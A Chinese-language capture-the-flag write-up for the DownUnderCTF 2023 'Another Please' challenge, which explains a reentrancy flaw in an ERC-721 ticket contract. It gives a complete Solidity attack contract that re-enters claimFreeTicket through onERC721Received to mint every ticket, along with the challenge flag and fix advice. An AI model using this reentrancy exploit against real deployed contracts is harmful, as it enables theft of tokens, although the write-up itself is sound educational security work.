# DownUnderCTF 2023 Another Please Writeup

## 题目简述

`AnotherPlease` 是一个 ERC-721 门票合约，共有 30 张票：10 张免费票和 20 张付费票。完成条件是玩家钱包持有全部 30 张。`claimFreeTicket` 使用 `_safeMint` 给调用者铸币，却在外部回调完成后才更新 `ticketsGivenAway` 和 `freeTicketReceivers`。

## 解题过程

调用顺序如下：

```solidity
_gibTicket(msg.sender);              // 内部调用 _safeMint
ticketsGivenAway++;
freeTicketReceivers[msg.sender] = true;
```

当接收方是合约时，`_safeMint` 会调用其 `onERC721Received`。此时免费票计数和领取标记仍未更新，可以在回调中再次进入 `claimFreeTicket`。每次先把新 NFT 转给玩家钱包，再继续重入；以 `totalTicketsAvailable()` 为上限，可以在最外层调用返回前铸完全部 30 张。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IAnotherPlease {
    function claimFreeTicket() external;
    function transferFrom(address from, address to, uint256 id) external;
    function totalTicketsAvailable() external view returns (uint256);
}

contract Solve is IERC721Receiver {
    uint256 private received;
    address private player;

    function solve(IAnotherPlease target) external {
        player = msg.sender;
        target.claimFreeTicket();
    }

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        received++;
        IAnotherPlease target = IAnotherPlease(msg.sender);
        target.transferFrom(address(this), player, tokenId);

        if (received < target.totalTicketsAvailable()) {
            target.claimFreeTicket();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

部署该合约后由玩家调用 `solve`，并给交易预留足够 Gas。交易结束时玩家余额达到 30，完成接口返回：

```text
DUCTF{now_thats_a_lotta_DUCTF_monke_nfts}
```

## 方法总结

漏洞是典型的 Checks-Effects-Interactions 顺序错误。`safeMint` 并非纯内部状态更新，它会向接收合约发起外部调用；领取标记应在铸币前更新，或使用重入锁。完成条件检查玩家钱包余额，因此回调中还需把每张票从攻击合约转给玩家。
